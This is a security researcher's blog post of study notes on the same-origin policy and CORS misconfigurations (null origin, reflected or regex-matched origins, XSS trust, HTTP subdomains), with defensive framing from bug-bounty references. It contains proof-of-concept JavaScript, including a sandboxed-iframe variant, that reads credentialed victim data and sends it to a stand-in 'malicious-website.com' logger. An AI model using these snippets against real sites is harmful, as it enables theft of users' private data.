<!doctype html>
<html lang="en-us">
  <head>
    <title>Cross-Origin Resource Sharing // Abdelrhman Allam</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.101.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="Abdelrhman Allam" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://sl4x0.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cross-Origin Resource Sharing"/>
<meta name="twitter:description" content="In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks.
References Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities
What is CORS cross-origin resource sharing
Cross-Origin Resource Sharing CORS MDN
CORS vulnerability
CORS Misconfiguration
CORS - Misconfigurations &amp; Bypass
PayloadsAllTheThings/README.md at master ¬∑ swisskyrepo/PayloadsAllTheThings
Exploiting Misconfigured CORS (Cross Origin Resource Sharing)"/>

    <meta property="og:title" content="Cross-Origin Resource Sharing" />
<meta property="og:description" content="In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks.
References Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities
What is CORS cross-origin resource sharing
Cross-Origin Resource Sharing CORS MDN
CORS vulnerability
CORS Misconfiguration
CORS - Misconfigurations &amp; Bypass
PayloadsAllTheThings/README.md at master ¬∑ swisskyrepo/PayloadsAllTheThings
Exploiting Misconfigured CORS (Cross Origin Resource Sharing)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sl4x0.github.io/web-notes/cors-misconfigration/" /><meta property="article:section" content="web-notes" />
<meta property="article:published_time" content="2022-07-12T23:48:05+00:00" />
<meta property="article:modified_time" content="2022-07-12T23:48:05+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://sl4x0.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Abdelrhman Allam" /></a>
      <h1>Abdelrhman Allam</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/about/">About</a>
             // 
          
          <a class="app-header-menu-item" href="/">Home</a>
             // 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Security Researcher üêõ</p>
      <div class="app-header-social">
        
          <a href="https://github.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>My Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://linkedin.com/in/sl4x0" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>My Twitter</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Cross-Origin Resource Sharing</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jul 12, 2022
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          14 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://sl4x0.github.io/tags/cors/">CORS</a>
              <a class="tag" href="https://sl4x0.github.io/tags/web-notes/">Web-Notes</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>In this section, we will explain what cross-origin resource sharing (CORS) is, describe some common examples of cross-origin resource sharing based attacks, and discuss how to protect against these attacks.</p>
<h1 id="references"><code>References</code></h1>
<p><a href="https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3">Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities</a></p>
<p><a href="https://portswigger.net/web-security/cors">What is CORS cross-origin resource sharing</a></p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing CORS MDN</a></p>
<p><a href="https://hakin9.org/cors-vulnerability/">CORS vulnerability</a></p>
<p><a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/cors-misconfiguration">CORS Misconfiguration</a></p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/cors-bypass">CORS - Misconfigurations &amp; Bypass</a></p>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md">PayloadsAllTheThings/README.md at master ¬∑ swisskyrepo/PayloadsAllTheThings</a></p>
<p><a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/">Exploiting Misconfigured CORS (Cross Origin Resource Sharing)</a></p>
<p><a href="https://www.linkedin.com/pulse/3-ways-exploit-misconfigured-cross-origin-resource-sharing-kumar-j">3 WAYS TO EXPLOIT MISCONFIGURED CROSS-ORIGIN RESOURCE SHARING (CORS)</a></p>
<p><a href="https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">Think Outside the Scope: Advanced CORS Exploitation Techniques</a></p>
<h1 id="what-is-sop-same-origin-ploicy-">What is SOP (Same Origin Ploicy) ?</h1>
<p>Its a rule enforced by browsers to control data between web applications. you cant read data from any application that not authorized.</p>
<ul>
<li>Its not prevent <code>Writing</code> it prevent <code>Reading</code>.</li>
<li>Access determined by <code>ORIGIN</code>.</li>
</ul>
<p>to have more flexbility ‚Üí You will need to loose SOP ‚Üí That lead to :</p>
<ul>
<li>Informations leakages</li>
<li>Authorization Bypass</li>
<li>Account Takeover</li>
</ul>
<h1 id="what-is-origin-"><code>What is ORIGIN ..?</code></h1>
<p>(<img src="https://user-images.githubusercontent.com/70459751/178595671-77d36197-109f-480c-b555-ea2b5fd62632.png" alt="image">)</p>
<h1 id="example">Example</h1>
<p>When i try to access to <a href="http://google.com">google.com</a> by origin <a href="http://attacker.com">attacker.com</a> that prevent me from doing that cause iam not in CORS policy of google.com.</p>
<h1 id="mechanism"><code>Mechanism</code></h1>
<p>If we have a scirpt form a page A ‚Üí can access data from a page B only if :</p>
<ul>
<li>they are of the same origin so they have same
<ul>
<li>Protocol</li>
<li>Hostname</li>
<li>Port Number</li>
</ul>
</li>
</ul>
<p>Authorization on modern web applications are by</p>
<ul>
<li>HTTP Cookies</li>
</ul>
<p>So that make SOP are very Important.</p>
<p>When SOP implement ‚Üí Malicious websites can‚Äôt take advantges of cookies stored in your browsers ‚Üí so that they can‚Äôt Access to you private information.</p>
<p>SOP are too restrictive, Multiple subdomains won‚Äôt share information if they are followed the policy.</p>
<p>Since the SOP is Inflexable ‚Üí they find a way to relax it, AND THEN THE SH*T CAME OUT!!</p>
<p>If you are an attacker trying to smuggling information from a bank site <a href="http://a.example.com">a.example.com</a> and find an account info at <a href="http://a.example.com/user_info">a.example.com/user_info</a></p>
<p>the victim is logging into the bank site and also visiting your site <a href="http://attacker.com">attacker.com</a></p>
<p>The attacker website issue a GET request to <a href="http://a.example.com/user_info">a.example.com/user_info</a> to retrive user informations</p>
<p>Since the user logged in ‚Üí His browser inclues his cookies in every request he make to <a href="http://a.example.com">a.example.com</a></p>
<p>If the request generated by a script on the attacker website [Because of SOP]</p>
<p>The victim‚Äôs Browser won‚Äôt Allow your site to read data from <a href="http://a.example.com">a.example.com</a></p>
<p>If you realize that <a href="http://a.example.com">a.example.com</a> pass info to <a href="http://b.example.com">b.example.com</a> via SOP Bypass. If you can find the technique, YOU CAN STEAL THE VICTIM INFORMATION.</p>
<hr>
<p>The simple way to work with SOP is to change the origin via JavaScript.</p>
<p>You can set the domain of</p>
<ul>
<li>a.example.com</li>
<li>b.example.com</li>
</ul>
<p>to main domain by</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>document.<span style="color:#a6e22e">domain</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;example.com&#34;</span>
</span></span></code></pre></div><p>This method is good but is has limitation ‚Üí So you can only set document.domain of the page to Superdomain</p>
<p>In instance, you can‚Äôt make the origin of <a href="http://a.example.com">a.example.com</a> to <a href="http://example2.com">example2.com</a> [They didn‚Äôt have the same Superdomain]</p>
<hr>
<h1 id="exploiting-cors"><code>Exploiting CORS</code></h1>
<p>Because of These limitaion ‚Üí Most sites uses the Cross Origin Resourse Sharing [CORS] to relax SOP.</p>
<p>CORS : is a mechanism tha protect data of server, It allow server to specify list of origins that allow to access its resourses via HTTP Response header</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Acccess</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span>
</span></span></code></pre></div><h1 id="example-1"><code>Example</code></h1>
<p>If we want to send <a href="http://a.example.com/user_info">a.example.com/user_info</a> to <a href="http://b.example.com">b.example.com</a></p>
<p>If we using SOP, we won‚Äôt be able to Access JSON As they are different Origins.</p>
<p>But in CORS we will send the origin header like that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>
</span></span></code></pre></div><p>If <a href="http://b.example.com">b.example.com</a> in whitelist with permission to access resourses on <a href="http://a.example.com">a.example.com</a> then it will send a response like that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origins</span><span style="color:#f92672">:</span><span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> 
</span></span></code></pre></div><p>Threre for the attacker can steal information by submmitinb this script in your website:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://vulnerable-website.com/sensitive-victim-data&#39;</span>,<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//malicious-website.com/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><hr>
<p>The Application can also return the response header with wildcard character ( * )</p>
<p>So it can be Access by any domain.</p>
<p>On the other hand if the requesting origin isn‚Äôt of <code>Whitelist</code> and not allowd to access resourses, the browser will block the requesting page form reading data.</p>
<hr>
<p>The Basics of CORS Misconfigration is to set the  <code>Access-Control-Allow-Origins</code> to ‚Äú Null ‚Äú that allow any website with null origin to Access resourses.</p>
<p>Another one is set <code>Access-Control-Allow-Origins</code> header to the origin to requesting page without validating.</p>
<hr>
<h1 id="errors-parsing-origin-headers"><strong><code>Errors parsing Origin headers</code></strong></h1>
<p>Some applications that support access from multiple origins by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist.</p>
<p>If the origin appears on the whitelist then it is reflected in the <code>Access-Control-Allow-Origin</code>header so that access is granted.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">data</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">normal</span><span style="color:#f92672">-</span><span style="color:#a6e22e">website</span>.<span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//innocent-website.com
</span></span></span></code></pre></div><p>When checking with withe list:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//innocent-website.com
</span></span></span></code></pre></div><p>Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (<code>including future subdomains not yet in existence)</code>. And some applications allow access from various other organizations&rsquo; domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.</p>
<p>For example, suppose an application grants access to all domains ending in: <code>normal-website.com</code></p>
<p>An attacker might be able to gain access by registering the domain: <code>hackersnormal-website.com</code></p>
<p>Alternatively, suppose an application grants access to all domains beginning with: <code>normal-website.com</code>
An attacker might be able to gain access using the domain: <code>normal-website.com.evil-user.net</code></p>
<h1 id="whitelisted-null-origin-value"><strong><code>Whitelisted null origin value</code></strong></h1>
<p>The specification for the Origin header supports the value <code>null</code> The Browser will send this Null value in different situations:</p>
<ul>
<li>Cross-origin redirects.</li>
<li>Requests from serialized data.</li>
<li>Request using the <code>file:</code> protocol.</li>
<li>Sandboxed cross-origin requests.</li>
</ul>
<p>For example, suppose an application receives the following cross-origin request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">sensitive</span><span style="color:#f92672">-</span><span style="color:#a6e22e">victim</span><span style="color:#f92672">-</span><span style="color:#a6e22e">data</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">website</span>.<span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
</span></span></code></pre></div><p>And the server responds with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>For example, this can be done using a sandboxed <code>iframe</code>
cross-origin request of the form:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">sandbox</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;allow-scripts allow-top-navigation allow-forms&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:text/html,&lt;script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">var req = new XMLHttpRequest();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">req.onload = reqListener;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">req.open(&#39;get&#39;,&#39;vulnerable-website.com/sensitive-victim-data&#39;,true);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">req.withCredentials = true;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">req.send();
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">function reqListener() {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">location=&#39;malicious-website.com/log?key=&#39;+this.responseText;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">};
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><hr>
<h1 id="exploiting-xss-via-cors-trust-relationships"><strong><code>Exploiting XSS via CORS trust relationships</code></strong></h1>
<p>Even &ldquo;correctly&rdquo; configured CORS establishes a trust relationship
between two origins. If a website trusts an origin that is vulnerable to
cross-site scripting (<a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a>), then an attacker could exploit the XSS to inject some JavaScript that
uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">requestApiKey</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">website</span>.<span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//subdomain.vulnerable-website.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sessionid</span><span style="color:#f92672">=</span>...
</span></span></code></pre></div><p>If the server responds with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//subdomain.vulnerable-website.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>attacker who finds an XSS vulnerability on <code>subdomain.vulnerable-website.com</code>could use that to retrieve the API key, using a URL like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//subdomain.vulnerable-website.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;
</span></span></span></code></pre></div><h1 id="breaking-tls-with-poorly-configured-cors"><strong><code>Breaking TLS with poorly configured CORS</code></strong></h1>
<p>Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">requestApiKey</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">website</span>.<span style="color:#a6e22e">com</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-subdomain.vulnerable-website.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sessionid</span><span style="color:#f92672">=</span>...
</span></span></code></pre></div><p>The application responds with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origin</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//trusted-subdomain.vulnerable-website.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Credentials</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span></code></pre></div><p>attacker who is in a position to intercept a victim user&rsquo;s traffic can exploit the CORS configuration to compromise the victim&rsquo;s interaction with the application. This attack involves the following steps:</p>
<ul>
<li>The victim user makes any plain HTTP request.</li>
<li>The attacker injects a redirection to:	<code>http://trusted-subdomain.vulnerable-website.com</code></li>
<li>The victim&rsquo;s browser follows the redirect.</li>
<li>The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:	<code>https://vulnerable-website.com</code></li>
<li>The victim&rsquo;s browser makes the CORS request, including the origin:	<code>http://trusted-subdomain.vulnerable-website.com</code></li>
<li>The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.</li>
<li>The attacker&rsquo;s spoofed page can read the sensitive data and transmit it to any domain under the attacker&rsquo;s control.</li>
</ul>
<p>This attack is effective even if the vulnerable website is otherwise
robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.</p>
<hr>
<p>Another misconfigration to use a weak regexes to validate origins.</p>
<p>If the policy check if the origin url start with <a href="http://www.example.com">www.example.com</a> the policy can be bypass by using <a href="http://www.example.com.attacker.com">www.example.com.attacker.com</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">Access</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Control</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Allow</span><span style="color:#f92672">-</span><span style="color:#a6e22e">Origins</span><span style="color:#f92672">:</span>  [<span style="color:#a6e22e">www</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">com</span>](<span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//www.example.com.attacker.com) 
</span></span></span></code></pre></div><p>Interisting Configration that isn‚Äôt exploitable is the wild card character ( * ).</p>
<p>So CORS didn‚Äôt allow credentials such that:</p>
<ul>
<li>Cookies</li>
<li>Authorization</li>
<li>Client Side Certificaitons</li>
</ul>
<hr>
<h1 id="exploiting-postmessage"><code>Exploiting postMessage()</code></h1>
